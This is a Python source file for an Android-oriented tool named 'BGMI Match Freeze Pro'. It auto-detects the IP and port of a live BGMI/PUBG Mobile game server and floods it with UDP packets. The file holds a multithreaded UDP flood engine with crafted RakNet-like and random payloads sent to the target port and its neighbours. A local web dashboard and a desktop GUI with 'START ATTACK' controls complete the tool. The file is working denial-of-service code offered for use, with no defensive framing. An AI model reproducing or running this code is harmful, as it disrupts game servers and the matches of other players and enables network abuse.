"""
BGMI MATCH FREEZE PRO - ANDROID EDITION
----------------------------------------
Features:
1. Auto IP & Port Finder for BGMI / PUBG Mobile active server connections.
2. Mobile UI (GUI & Web Dashboard) compatible with Pydroid 3, Termux, and Android APK builds.
3. High-throughput multi-socket UDP packet stress engine.
"""

import os
import sys
import time
import socket
import random
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import json

from auto_finder import find_bgmi_ip_port

# Global State
ATTACK_STATE = {
    "is_running": False,
    "ip": "",
    "port": 0,
    "threads": 150,
    "duration": 120,
    "packets_sent": 0,
    "bytes_sent": 0,
    "start_time": 0,
    "stop_time": 0,
    "log_history": []
}

_lock = threading.Lock()

def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    entry = f"[{timestamp}] {msg}"
    print(entry)
    with _lock:
        ATTACK_STATE["log_history"].append(entry)
        if len(ATTACK_STATE["log_history"]) > 100:
            ATTACK_STATE["log_history"].pop(0)

def udp_attack_worker(ip, port, stop_timestamp):
    raknet_magic = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
    payload_pool = [
        b"\x01\x00\x00\x00\x09" + raknet_magic + random._urandom(120),
        b"\x04\x00\x00\x00\x00\x01\x00\x00" + random._urandom(500),
        b"\x02\x00\x00\x00" + random._urandom(1000),
        b"\xff\xff\xff\xff\x55\x53" + random._urandom(1380),
        random._urandom(1420),
        random._urandom(256),
    ]
    payload_sizes = [len(p) for p in payload_pool]
    num_payloads = len(payload_pool)

    target_ports = [
        port,
        port + 1,
        port - 1,
        port + 2 if port + 2 < 65535 else port
    ]
    num_ports = len(target_ports)

    local_pkts = 0
    local_bytes = 0
    idx = 0

    while ATTACK_STATE["is_running"] and time.time() < stop_timestamp:
        sockets = []
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
                except Exception:
                    pass
                sockets.append(s)
            except Exception:
                pass

        if not sockets:
            try:
                sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
            except Exception:
                time.sleep(0.01)
                continue

        num_sockets = len(sockets)

        for _ in range(500):
            if not ATTACK_STATE["is_running"]:
                break
            try:
                current_sock = sockets[idx % num_sockets]
                p_idx = idx % num_payloads
                payload = payload_pool[p_idx]
                size = payload_sizes[p_idx]
                target = (ip, target_ports[idx % num_ports])

                current_sock.sendto(payload, target)
                local_pkts += 1
                local_bytes += size
                idx += 1
            except Exception:
                pass

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    with _lock:
        ATTACK_STATE["packets_sent"] += local_pkts
        ATTACK_STATE["bytes_sent"] += local_bytes

def start_attack_session(ip, port, duration=120, threads=150):
    if ATTACK_STATE["is_running"]:
        return False, "Attack is already running!"

    ATTACK_STATE["is_running"] = True
    ATTACK_STATE["ip"] = ip
    ATTACK_STATE["port"] = port
    ATTACK_STATE["duration"] = duration
    ATTACK_STATE["threads"] = threads
    ATTACK_STATE["packets_sent"] = 0
    ATTACK_STATE["bytes_sent"] = 0
    ATTACK_STATE["start_time"] = time.time()
    ATTACK_STATE["stop_time"] = time.time() + duration

    log(f"🚀 Starting Android Match Freeze on {ip}:{port} | Threads: {threads} | Time: {duration}s")

    for _ in range(threads):
        t = threading.Thread(target=udp_attack_worker, args=(ip, port, ATTACK_STATE["stop_time"]))
        t.daemon = True
        t.start()

    # Timer thread for auto-stop
    def auto_stop_timer():
        time.sleep(duration)
        if ATTACK_STATE["is_running"]:
            stop_attack_session()

    t_timer = threading.Thread(target=auto_stop_timer)
    t_timer.daemon = True
    t_timer.start()

    return True, "Attack started successfully!"

def stop_attack_session():
    if not ATTACK_STATE["is_running"]:
        return False, "No attack is currently running."

    ATTACK_STATE["is_running"] = False
    mb = round(ATTACK_STATE["bytes_sent"] / (1024 * 1024), 2)
    pkts = ATTACK_STATE["packets_sent"]
    log(f"🛑 Attack Stopped. Sent {pkts:,} packets ({mb} MB).")
    return True, f"Stopped. Sent {pkts:,} packets ({mb} MB)."

# --- MOBILE WEB UI SERVER (Runs locally on Android phone) ---
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BGMI Match Freeze Pro - Android</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #0d1117; color: #c9d1d9; padding: 15px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        h1 { color: #58a6ff; text-align: center; font-size: 1.4rem; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 20px; font-size: 0.8rem; font-weight: bold; }
        .status-idle { background: #21262d; color: #8b949e; }
        .status-running { background: #238636; color: #fff; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
        label { display: block; margin-top: 10px; font-size: 0.85rem; color: #8b949e; }
        input { width: 100%; padding: 12px; margin-top: 5px; background: #0d1117; border: 1px solid #30363d; color: #fff; border-radius: 8px; font-size: 1rem; }
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        button { flex: 1; padding: 14px; border: none; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; transition: 0.2s; }
        .btn-find { background: #d97706; color: white; }
        .btn-start { background: #dc2626; color: white; }
        .btn-stop { background: #16a34a; color: white; }
        button:active { transform: scale(0.97); }
        .stats { display: flex; justify-content: space-between; margin-top: 15px; background: #0d1117; padding: 12px; border-radius: 8px; font-size: 0.9rem; }
        .stat-val { font-weight: bold; color: #58a6ff; }
        #logs { background: #000; border: 1px solid #30363d; border-radius: 8px; padding: 10px; height: 160px; overflow-y: auto; font-family: monospace; font-size: 0.8rem; color: #3fb950; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎮 BGMI Freeze Pro (Android)</h1>
        <div style="text-align: center; margin-bottom: 10px;">
            <span id="status-badge" class="badge status-idle">STATUS: IDLE</span>
        </div>

        <button class="btn-find" onclick="autoFind()">⚡ AUTO FIND GAME IP & PORT</button>

        <label>Target Server IP</label>
        <input type="text" id="ip" placeholder="e.g. 1.1.1.1">

        <label>Target Port</label>
        <input type="number" id="port" placeholder="e.g. 17000">

        <div style="display: flex; gap: 10px;">
            <div style="flex:1;">
                <label>Threads</label>
                <input type="number" id="threads" value="150">
            </div>
            <div style="flex:1;">
                <label>Time (Sec)</label>
                <input type="number" id="duration" value="120">
            </div>
        </div>

        <div class="btn-group">
            <button class="btn-start" id="btn-toggle" onclick="toggleAttack()">🚀 START ATTACK</button>
        </div>

        <div class="stats">
            <div>Packets: <span class="stat-val" id="pkts">0</span></div>
            <div>Data: <span class="stat-val" id="bytes">0 MB</span></div>
        </div>

        <div id="logs">Initializing Android BGMI Stresser Engine...\n</div>
    </div>

    <script>
        let isRunning = false;

        async function autoFind() {
            log("🔍 Scanning active game connections...");
            try {
                let res = await fetch('/api/autofind');
                let data = await res.json();
                if(data.ip && data.port) {
                    document.getElementById('ip').value = data.ip;
                    document.getElementById('port').value = data.port;
                    log("🎯 " + data.msg);
                } else {
                    log("⚠️ " + data.msg);
                }
            } catch(e) {
                log("❌ Auto-find failed: " + e);
            }
        }

        async function toggleAttack() {
            if(isRunning) {
                let res = await fetch('/api/stop');
                let data = await res.json();
                log(data.msg);
            } else {
                let ip = document.getElementById('ip').value.trim();
                let port = document.getElementById('port').value.trim();
                let threads = document.getElementById('threads').value.trim();
                let duration = document.getElementById('duration').value.trim();

                if(!ip || !port) {
                    alert("Please enter IP and Port or click Auto Find!");
                    return;
                }

                let res = await fetch(`/api/start?ip=${ip}&port=${port}&threads=${threads}&duration=${duration}`);
                let data = await res.json();
                log(data.msg);
            }
        }

        function log(msg) {
            let logBox = document.getElementById('logs');
            logBox.innerHTML += msg + "<br>";
            logBox.scrollTop = logBox.scrollHeight;
        }

        async function updateStatus() {
            try {
                let res = await fetch('/api/status');
                let data = await res.json();
                isRunning = data.is_running;

                let badge = document.getElementById('status-badge');
                let btn = document.getElementById('btn-toggle');
                let pkts = document.getElementById('pkts');
                let bytes = document.getElementById('bytes');

                pkts.innerText = data.packets_sent.toLocaleString();
                bytes.innerText = (data.bytes_sent / (1024*1024)).toFixed(2) + " MB";

                if(isRunning) {
                    badge.className = "badge status-running";
                    badge.innerText = `ATTACKING ${data.ip}:${data.port}`;
                    btn.className = "btn-stop";
                    btn.innerText = "🛑 STOP ATTACK";
                } else {
                    badge.className = "badge status-idle";
                    badge.innerText = "STATUS: IDLE";
                    btn.className = "btn-start";
                    btn.innerText = "🚀 START ATTACK";
                }

                if(data.log_history && data.log_history.length > 0) {
                    let logBox = document.getElementById('logs');
                    logBox.innerHTML = data.log_history.join("<br>");
                    logBox.scrollTop = logBox.scrollHeight;
                }
            } catch(e) {}
        }

        setInterval(updateStatus, 1000);
    </script>
</body>
</html>
"""

class MobileRequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return  # Suppress HTTP server noise

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if path == "/" or path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_TEMPLATE.encode('utf-8'))

        elif path == "/api/autofind":
            ip, port, msg = find_bgmi_ip_port()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            response = {"ip": ip, "port": port, "msg": msg}
            self.wfile.write(json.dumps(response).encode('utf-8'))

        elif path == "/api/start":
            ip = query.get("ip", [""])[0]
            port = int(query.get("port", [0])[0]) if query.get("port") else 0
            threads = int(query.get("threads", [150])[0])
            duration = int(query.get("duration", [120])[0])

            success, msg = start_attack_session(ip, port, duration, threads)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"success": success, "msg": msg}).encode('utf-8'))

        elif path == "/api/stop":
            success, msg = stop_attack_session()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"success": success, "msg": msg}).encode('utf-8'))

        elif path == "/api/status":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(ATTACK_STATE).encode('utf-8'))

        else:
            self.send_response(404)
            self.end_headers()

def start_mobile_server(port=5000):
    server = HTTPServer(('0.0.0.0', port), MobileRequestHandler)
    print(f"==================================================")
    print(f"📱 BGMI Android App Server Running!")
    print(f"👉 Open in phone browser: http://localhost:{port}")
    print(f"👉 Or on local Wi-Fi: http://<your-phone-ip>:{port}")
    print(f"==================================================")
    
    # Auto open browser if possible
    try:
        import webbrowser
        webbrowser.open(f"http://localhost:{port}")
    except Exception:
        pass

    server.serve_forever()

if __name__ == "__main__":
    # Try GUI via Tkinter / CustomTkinter or launch Web UI
    try:
        import customtkinter as ctk
        
        class AndroidTkApp(ctk.CTk):
            def __init__(self):
                super().__init__()
                self.title("BGMI Match Freeze - Android Edition")
                self.geometry("380x640")
                
                self.ip_entry = ctk.CTkEntry(self, placeholder_text="Target Server IP", width=300)
                self.ip_entry.pack(pady=8)
                
                self.port_entry = ctk.CTkEntry(self, placeholder_text="Target Port", width=300)
                self.port_entry.pack(pady=8)
                
                self.find_btn = ctk.CTkButton(self, text="⚡ AUTO FIND IP & PORT", fg_color="#E67E22", hover_color="#D35400", command=self.do_find)
                self.find_btn.pack(pady=8)
                
                self.threads_entry = ctk.CTkEntry(self, placeholder_text="Threads (default 150)", width=300)
                self.threads_entry.pack(pady=8)
                
                self.time_entry = ctk.CTkEntry(self, placeholder_text="Duration (seconds)", width=300)
                self.time_entry.pack(pady=8)
                
                self.action_btn = ctk.CTkButton(self, text="🚀 START ATTACK", fg_color="red", hover_color="darkred", command=self.toggle)
                self.action_btn.pack(pady=12)
                
                self.log_box = ctk.CTkTextbox(self, width=340, height=180)
                self.log_box.pack(pady=10)
                
                # Start background status sync
                self.after(1000, self.sync)
                
            def do_find(self):
                ip, port, msg = find_bgmi_ip_port()
                if ip and port:
                    self.ip_entry.delete(0, "end")
                    self.ip_entry.insert(0, str(ip))
                    self.port_entry.delete(0, "end")
                    self.port_entry.insert(0, str(port))
                    log(f"🎯 {msg}")
                else:
                    log(f"⚠️ {msg}")
                    
            def toggle(self):
                if ATTACK_STATE["is_running"]:
                    stop_attack_session()
                    self.action_btn.configure(text="🚀 START ATTACK", fg_color="red")
                else:
                    ip = self.ip_entry.get().strip()
                    port = self.port_entry.get().strip()
                    threads = self.threads_entry.get().strip()
                    duration = self.time_entry.get().strip()
                    if not ip or not port:
                        log("⚠️ Fill IP and Port first!")
                        return
                    start_attack_session(ip, int(port), int(duration) if duration else 120, int(threads) if threads else 150)
                    self.action_btn.configure(text="🛑 STOP ATTACK", fg_color="green")
                    
            def sync(self):
                if ATTACK_STATE["log_history"]:
                    self.log_box.delete("1.0", "end")
                    self.log_box.insert("1.0", "\n".join(ATTACK_STATE["log_history"]))
                    self.log_box.see("end")
                self.after(1000, self.sync)

        # Also start web server in thread
        t_web = threading.Thread(target=start_mobile_server, args=(5000,))
        t_web.daemon = True
        t_web.start()
        
        gui = AndroidTkApp()
        gui.mainloop()
        
    except Exception as e:
        # Fallback to pure Web UI / Server mode on Android Pydroid/Termux
        start_mobile_server(5000)
